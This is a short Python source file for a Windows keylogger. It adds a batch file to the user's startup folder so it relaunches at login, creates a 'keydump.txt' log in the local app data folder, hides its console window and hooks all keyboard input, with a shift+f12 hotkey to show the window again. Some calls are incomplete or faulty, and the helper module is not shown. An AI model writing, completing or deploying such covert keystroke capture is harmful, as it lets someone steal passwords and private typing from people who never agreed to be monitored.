#!/usr/bin/env python3

import os, sys
import winshell
from keyutil import *
import keyboard
import platform

thispath = os.path.abspath(__file__)
pypath = sys.executable
startup = winshell.startup()
applocal = os.getenv("LOCALAPPDATA")

if platform.system() == "Windows" and not os.path.exists(f"{startup}\klg.bat"):
    newbat(thispath, pypath, startup)
    createlog(applocal, "keydump.txt")
    keyboard.add_hotkey("shift+f12", showwindow(), trigger_on_release = True) 

hidecmd()

keyboard.hook()

